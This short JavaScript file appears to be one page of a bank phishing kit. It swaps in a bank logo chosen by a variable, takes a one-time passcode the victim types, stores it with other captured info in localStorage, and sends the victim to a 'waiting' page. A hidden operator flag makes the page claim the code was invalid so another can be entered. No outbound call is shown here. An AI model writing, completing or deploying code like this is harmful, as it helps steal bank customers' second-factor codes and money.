const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            alert('Código OTP inválido.');
        }
    }catch(err){
        console.log(err);
    }
}, 2000);

// image and span
document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);

const btnNextStep = document.querySelector('#next-step');
btnNextStep.addEventListener('submit', e => {
    e.preventDefault();

    if(document.querySelector('#otp').value !== ''){
        info.metaInfo.tok = document.querySelector('#otp').value;
        LS.setItem('info', JSON.stringify(info));
        window.location.href = 'waiting.html';
    }else{
        document.querySelector('#otp').classList.add('input-error');
    }
});